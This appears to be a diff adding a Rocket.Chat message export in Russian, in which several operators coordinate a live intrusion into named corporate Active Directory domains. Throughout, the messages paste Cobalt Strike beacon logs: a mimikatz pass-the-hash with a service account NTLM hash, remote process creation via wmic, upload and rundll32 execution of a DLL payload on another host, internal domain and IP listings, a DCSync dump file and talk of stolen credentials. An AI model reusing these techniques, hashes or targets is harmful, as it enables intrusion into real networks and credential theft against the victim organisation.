+      "_updatedAt": "2020-10-07T19:46:29.302Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "g48oSJzbKf5GoY9um",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "в датацентр мало серверов что ли",
+      "ts": "2020-10-07T19:46:21.363Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:46:21.400Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "5zw4aLDbeRENvxJDi",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "[ ](https://mediaeveryone.com/group/saiglobal-com?msg=u28Sfxmtj3eQaJJTo) я же писал",
+      "ts": "2020-10-07T19:45:22.259Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:45:22.291Z",
+      "attachments": [
+        {
+          "text": "открой любой другой сервер",
+          "author_name": "tl1",
+          "author_icon": "/avatar/tl1",
+          "message_link": "https://mediaeveryone.com/group/saiglobal-com?msg=u28Sfxmtj3eQaJJTo",
+          "attachments": [],
+          "ts": "2020-10-07T18:56:50.665Z"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://mediaeveryone.com/group/saiglobal-com?msg=u28Sfxmtj3eQaJJTo",
+          "ignoreParse": true
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "nqLMAZ3pGSGsb4RY5",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "как раз",
+      "ts": "2020-10-07T19:44:47.235Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:44:47.285Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "8rnGSQnzqTi32gz47",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "креды то я в синке и взял",
+      "ts": "2020-10-07T19:44:45.309Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:44:45.344Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "2WdXwxDn8AngPdtFH",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "на датацентре делка не отрабатывала",
+      "ts": "2020-10-07T19:44:41.074Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:44:41.107Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "vXD7NsR6Xs5vgXfsg",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "а стоп",
+      "ts": "2020-10-07T19:44:33.513Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:44:33.541Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ieqSbQWLq2EAWHYQb",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "там у всех админов пассы сменили?",
+      "ts": "2020-10-07T19:44:13.908Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:44:13.940Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "jAvozonyawRZb5DMK",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "вот дсинк с этого домена",
+      "ts": "2020-10-07T19:44:07.823Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:44:07.864Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "LGBgsiCrsm4CzCoY7",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "ts": "2020-10-07T19:44:01.733Z",
+      "msg": "",
+      "file": {
+        "_id": "AutXhWyHsNPwjMrdS",
+        "name": "DCSync.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "DCSync.txt",
+          "title_link": "/file-upload/AutXhWyHsNPwjMrdS/DCSync.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:44:01.775Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "riqca2pAbRL4bmDRW",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "которыми прошлый раз лез",
+      "ts": "2020-10-07T19:43:20.738Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:43:20.764Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "xENQLCwBwB259bHXf",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "те не подошли",
+      "ts": "2020-10-07T19:43:15.250Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:43:15.284Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "CrZ8G8E2bZG6vGqwb",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "от датацентра кредов нет",
+      "ts": "2020-10-07T19:43:12.230Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:43:12.267Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "nr9kn7sJ6i2SQQPEc",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "SaigProd.local [10.195.100.1]",
+      "ts": "2020-10-07T19:43:03.753Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:43:03.803Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "8df8BanSw7xDoAWKR",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "ты сюда лезешь?",
+      "ts": "2020-10-07T19:42:55.503Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:42:55.534Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Y7Np6NrdSbrznWDqc",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\ndatacenter.local [10.225.10.200]\n```",
+      "ts": "2020-10-07T19:42:52.671Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:42:52.728Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "n8GQGyWzdn7PkbGm9",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "ты про это?\n```\nsaig.frd.global [10.210.8.236]\ndatacenter.local [10.225.10.200]\nfrd.global [10.225.12.1]\nSaigProd.local [10.195.100.1]\nc360.local [10.195.43.2]\nlegalco.local [10.195.23.1]\n```",
+      "ts": "2020-10-07T19:42:01.582Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:42:01.661Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "FB9PXJY4b3QfuxaAQ",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "другие сервера тоже закрыты?",
+      "ts": "2020-10-07T19:41:18.028Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:41:18.059Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "zy5W7vHdMSohmLJLx",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\nbeacon> shell type \\\\10.195.100.1\\C$\\ProgramData\\p.txt\n[*] Tasked beacon to run: type \\\\10.195.100.1\\C$\\ProgramData\\p.txt\n[+] host called home, sent: 71 bytes\n[+] received output:\n\nPinging google.com [216.58.196.142] with 32 bytes of data:\nReply from 216.58.196.142: bytes=32 time=2ms TTL=114\nReply from 216.58.196.142: bytes=32 time=2ms TTL=114\nReply from 216.58.196.142: bytes=32 time=2ms TTL=114\nReply from 216.58.196.142: bytes=32 time=2ms TTL=114\n\nPing statistics for 216.58.196.142:\n    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 2ms, Maximum = 2ms, Average = 2ms\n```",
+      "ts": "2020-10-07T19:40:45.419Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:40:45.584Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "9RjjETBxuDkdF4ibm",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "а в файле?",
+      "ts": "2020-10-07T19:39:59.154Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:39:59.198Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "FFu3fgy9nb4agLyvN",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\nbeacon> shell wmic /node:10.195.100.1 process call create \"cmd /c ping google.com > C:\\ProgramData\\p.txt\"\n[*] Tasked beacon to run: wmic /node:10.195.100.1 process call create \"cmd /c ping google.com > C:\\ProgramData\\p.txt\"\n[+] host called home, sent: 122 bytes\n[+] received output:\nExecuting (Win32_Process)->Create()\n\nMethod execution successful.\n\nOut Parameters:\ninstance of __PARAMETERS\n{\n\tProcessId = 5772;\n\tReturnValue = 0;\n};\n\n\nbeacon> shell dir \\\\10.195.100.1\\C$\\ProgramData\\p.txt\n[*] Tasked beacon to run: dir \\\\10.195.100.1\\C$\\ProgramData\\p.txt\n[+] host called home, sent: 70 bytes\n[+] received output:\n Volume in drive \\\\10.195.100.1\\C$ has no label.\n Volume Serial Number is B042-5E3A\n\n Directory of \\\\10.195.100.1\\C$\\ProgramData\n\n10/07/2020  03:38 PM               472 p.txt\n               1 File(s)            472 bytes\n               0 Dir(s)  63,656,124,416 bytes free\n\n```",
+      "ts": "2020-10-07T19:39:13.222Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:39:13.443Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "6N9AS33LP26Dct4bA",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "ты так и не отпинговал гугл оттуда?",
+      "ts": "2020-10-07T19:36:15.265Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:36:15.298Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "DdxGJEyxzQBcytMAv",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "а внешку то видит? xD",
+      "ts": "2020-10-07T19:36:10.270Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:36:10.311Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "qYa38qBZeQ52Zvuqy",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "сессии опять нет нихуя",
+      "ts": "2020-10-07T19:35:23.957Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:35:23.997Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "X7eJw6JTxLBHx2TyR",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\nbeacon> pth SaigProd.local\\svc.sccmcliinst aa9249f57aba289658fde8afe795fd67\n[*] Tasked beacon to run mimikatz's sekurlsa::pth /user:svc.sccmcliinst /domain:SaigProd.local /ntlm:aa9249f57aba289658fde8afe795fd67 /run:\"%COMSPEC% /c echo bc8a1c163ef > \\\\.\\pipe\\ef7d36\" command\n[+] host called home, sent: 23 bytes\n[+] host called home, sent: 438863 bytes\n[+] Impersonated NT AUTHORITY\\SYSTEM\n[+] received output:\nuser\t: svc.sccmcliinst\ndomain\t: SaigProd.local\nprogram\t: C:\\Windows\\system32\\cmd.exe /c echo bc8a1c163ef > \\\\.\\pipe\\ef7d36\nimpers.\t: no\nNTLM\t: aa9249f57aba289658fde8afe795fd67\n  |  PID  5712\n  |  TID  4988\n  |  LSA Process is now R/W\n  |  LUID 0 ; 1593611577 (00000000:5efc9539)\n  \\_ msv1_0   - data copy @ 0000006D65BDB260 : OK !\n  \\_ kerberos - data copy @ 0000006D6776C4E8\n   \\_ aes256_hmac       -> null             \n   \\_ aes128_hmac       -> null             \n   \\_ rc4_hmac_nt       OK\n   \\_ rc4_hmac_old      OK\n   \\_ rc4_md4           OK\n   \\_ des_cbc_md5       -> null             \n   \\_ des_cbc_crc       -> null             \n   \\_ rc4_hmac_nt_exp   OK\n   \\_ rc4_hmac_old_exp  OK\n   \\_ *Password replace @ 0000006D65B7ABC8 (16) -> null\n\nbeacon> ls \\\\10.195.100.1\\C$\\ProgramData\n[*] Tasked beacon to list files in \\\\10.195.100.1\\C$\\ProgramData\n[+] host called home, sent: 47 bytes\n[*] Listing: \\\\10.195.100.1\\C$\\ProgramData\\\n\n Size     Type    Last Modified         Name\n ----     ----    -------------         ----\n          dir     08/22/2013 10:48:41   Application Data\n          dir     08/22/2013 10:48:41   Desktop\n          dir     08/22/2013 10:48:41   Documents\n          dir     10/06/2020 00:44:16   FireEye\n          dir     07/16/2020 08:54:26   Microsoft\n          dir     07/25/2020 03:40:51   Package Cache\n          dir     11/14/2013 02:16:11   regid.1991-06.com.microsoft\n          dir     08/22/2013 10:48:41   Start Menu\n          dir     08/22/2013 10:48:41   Templates\n          dir     07/25/2020 03:41:11   VMware\n 70kb     fil     09/19/2020 21:56:17   ntuser.pol\n\nbeacon> pwd\n[*] Tasked beacon to print working directory\n[+] host called home, sent: 8 bytes\n[*] Current directory is C:\\Windows\nbeacon> cd C:\\ProgramData\n[*] cd C:\\ProgramData\n[+] host called home, sent: 22 bytes\nbeacon> upload /home/user/Desktop/cobalt/dll_maker/x64.dll\n[*] Tasked beacon to upload /home/user/Desktop/cobalt/dll_maker/x64.dll as x64.dll\n[+] host called home, sent: 139699 bytes\nbeacon> shell copy x64.dll \\\\10.195.100.1\\C$\\ProgramData\n[*] Tasked beacon to run: copy x64.dll \\\\10.195.100.1\\C$\\ProgramData\n[+] host called home, sent: 73 bytes\n[+] received output:\n        1 file(s) copied.\n\nbeacon> shell dir \\\\10.195.100.1\\C$\\ProgramData\n[*] Tasked beacon to run: dir \\\\10.195.100.1\\C$\\ProgramData\n[+] host called home, sent: 64 bytes\nbeacon> shell dir \\\\10.195.100.1\\C$\\ProgramData\\x64.dll\n[+] received output:\n Volume in drive \\\\10.195.100.1\\C$ has no label.\n Volume Serial Number is B042-5E3A\n\n Directory of \\\\10.195.100.1\\C$\\ProgramData\n\n10/06/2020  12:44 AM    <DIR>          FireEye\n07/25/2020  03:40 AM    <DIR>          Package Cache\n11/14/2013  03:16 AM    <DIR>          regid.1991-06.com.microsoft\n07/25/2020  03:41 AM    <DIR>          VMware\n10/07/2020  03:31 PM           139,680 x64.dll\n               1 File(s)        139,680 bytes\n               4 Dir(s)  63,656,927,232 bytes free\n\n[*] Tasked beacon to run: dir \\\\10.195.100.1\\C$\\ProgramData\\x64.dll\n[+] host called home, sent: 72 bytes\n[+] received output:\n Volume in drive \\\\10.195.100.1\\C$ has no label.\n Volume Serial Number is B042-5E3A\n\n Directory of \\\\10.195.100.1\\C$\\ProgramData\n\n10/07/2020  03:31 PM           139,680 x64.dll\n               1 File(s)        139,680 bytes\n               0 Dir(s)  63,656,927,232 bytes free\n\nbeacon> shell wmic /node:10.195.100.1 process call create \"rundll32 C:\\ProgramData\\x64.dll entryPoint\"\n[*] Tasked beacon to run: wmic /node:10.195.100.1 process call create \"rundll32 C:\\ProgramData\\x64.dll entryPoint\"\n[+] host called home, sent: 119 bytes\n[+] received output:\nExecuting (Win32_Process)->Create()\n\nMethod execution successful.\n\nOut Parameters:\ninstance of __PARAMETERS\n{\n\tProcessId = 5056;\n\tReturnValue = 0;\n};\n\n\nbeacon> shell dir \\\\10.195.100.1\\C$\\ProgramData\\x64.dll\n[*] Tasked beacon to run: dir \\\\10.195.100.1\\C$\\ProgramData\\x64.dll\n[+] host called home, sent: 72 bytes\n[+] received output:\n Volume in drive \\\\10.195.100.1\\C$ has no label.\n Volume Serial Number is B042-5E3A\n\n Directory of \\\\10.195.100.1\\C$\\ProgramData\n\nFile Not Found\n\n```",
+      "ts": "2020-10-07T19:35:17.103Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:35:17.433Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "gKvH4FeGyAkxhiGeF",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "это локальное обращение ведь",
+      "ts": "2020-10-07T19:20:32.947Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T19:20:32.989Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "TGm5jA4uHvjNntYGS",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "то /node указывать нет смысла",
+      "ts": "2020-10-07T19:20:24.498Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T19:20:24.538Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "vXKoi74GQYZ27np2J",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "если ты на дедике делаешь в рамках своей же машины",
+      "ts": "2020-10-07T19:20:21.186Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T19:20:21.217Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Wb3LjYC7ybiJhhKBy",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "там есть только АД",
+      "ts": "2020-10-07T19:20:02.657Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:20:02.694Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "c3bYzWefLySjnaWMf",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "я пошёл доделывать за user4",
+      "ts": "2020-10-07T19:19:55.227Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:19:55.269Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "BD28KCb7JWkkDFmB2",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "да с тем же успехом можно спросить если на дедике то почему вообще вмик",
+      "ts": "2020-10-07T19:19:49.221Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:19:49.256Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "p7cAuE9g96wXQbs4S",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "зачем /node ?",
+      "ts": "2020-10-07T19:18:33.796Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T19:18:33.822Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "NNRkYHW6XuWE53cWo",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "если на дедике - то почему через вмик на другой хост?",
+      "ts": "2020-10-07T19:18:29.586Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T19:18:29.625Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "5c9xiAPhSK9EddvPw",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "и не хватает там cmd /c в начале",
+      "ts": "2020-10-07T19:17:55.902Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:17:55.937Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "GAydKkNNfrAvGt5bR",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "@tl2 он на дедике пробует",
+      "ts": "2020-10-07T19:17:43.672Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:17:43.715Z",
+      "mentions": [
+        {
+          "_id": "Rmne8eAkiu37dhm5z",
+          "username": "tl2",
+          "name": "Team Lead 2"
+        }
+      ],
+      "channels": []
+    },
+    {
+      "_id": "nzYopFSCorG9MJYxS",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "зачем так если я это прям в дедике все делаю",
+      "ts": "2020-10-07T19:17:41.298Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:17:41.339Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "aWwrGMGGBAPtF2jba",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "вмик запускает процесс для контекста удаленной машины и сохраняет результат соответственно на ней же",
+      "ts": "2020-10-07T19:17:22.846Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T19:17:22.871Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "3PTr4TAeXiBddPFdq",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "тратим время\n\nls \\\\169.254.195.31\\c$\\ProgramData",
+      "ts": "2020-10-07T19:17:08.946Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T19:17:08.976Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "3msmxY7rpBPoRbno9",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "еще 1 ошибка",
+      "ts": "2020-10-07T19:15:56.817Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:15:56.854Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "THw3xn37haPLnFdh6",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "другое дело, уже путь верный",
+      "ts": "2020-10-07T19:15:53.707Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:15:53.751Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "dTGueMR6Bw6DLs489",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\nbeacon> shell wmic /node:169.254.195.31 process call create \"ping google.com>C:\\ProgramData\\SOOQA.txt\"\n[*] Tasked beacon to run: wmic /node:169.254.195.31 process call create \"ping google.com>C:\\ProgramData\\SOOQA.txt\"\n[+] host called home, sent: 119 bytes\nExecuting (Win32_Process)->Create()\n\nMethod execution successful.\n\nOut Parameters:\ninstance of __PARAMETERS\n{\n\tProcessId = 1156;\n\tReturnValue = 0;\n};\n\n\n\n\n Directory of C:\\ProgramData\n\n09/28/2020  01:22 PM    <DIR>          Applications\n10/05/2020  11:48 AM    <DIR>          Binary Fortress Software\n10/02/2020  03:52 PM            25,604 cn-matches.txt\n10/03/2020  04:18 PM             6,518 hostnames.txt\n10/02/2020  03:37 PM                 0 matches-share.txt\n10/02/2020  05:37 PM       818,088,516 matches_sysvol.rar\n09/23/2020  12:31 PM    <DIR>          Mozilla\n10/07/2020  09:03 PM               482 output.txt\n09/28/2020  02:11 PM    <DIR>          Package Cache\n10/03/2020  04:18 PM               511 ping.bat\n10/07/2020  07:01 PM    <DIR>          regid.1991-06.com.microsoft\n10/03/2020  08:19 PM            18,878 result.txt\n               7 File(s)    818,140,509 bytes\n               5 Dir(s)  168,773,038,080 bytes free\n\n```",
+      "ts": "2020-10-07T19:14:59.296Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:15:25.825Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-10-07T19:15:25.821Z",
+      "editedBy": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8"
+      },
+      "urls": []
+    },
+    {
+      "_id": "89T7fqDQvvxcsML3g",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "вообще какая-то болезненная штука этот пинг",
+      "ts": "2020-10-07T19:13:55.211Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:13:55.246Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "jL4sN2BTB8T74BPrM",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "опять что ли внимание на ping обратить",
+      "ts": "2020-10-07T19:13:39.152Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:13:39.184Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "jneCNtkai6cZjbwcp",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\nbeacon> shell wmic /node:169.254.195.31 process call create \"ping google.com>C:\\Windows\\Temp\\SOOQA.txt\"\nC:\\ProgramData\n```",
+      "ts": "2020-10-07T19:10:23.239Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:10:23.316Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ynkzTgAMBxbmJvznv",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "да ты серьезно да",
+      "ts": "2020-10-07T19:10:10.749Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:10:10.779Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "hdkSz2dCuP7ueSzFD",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "бля",
+      "ts": "2020-10-07T19:10:07.239Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:10:07.275Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "WRb98dZEidq2Cwg8L",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "а то что хуйней страдаем это ты прав)",
+      "ts": "2020-10-07T19:09:38.142Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:09:38.180Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "GoRrDMjXENvqGZkTi",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "разбирайся",
+      "ts": "2020-10-07T19:08:14.820Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:08:14.837Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "t2DqmuYTNNPkYGW3m",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "я щас повторю снова забудешь",
+      "ts": "2020-10-07T19:08:10.845Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:08:10.888Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
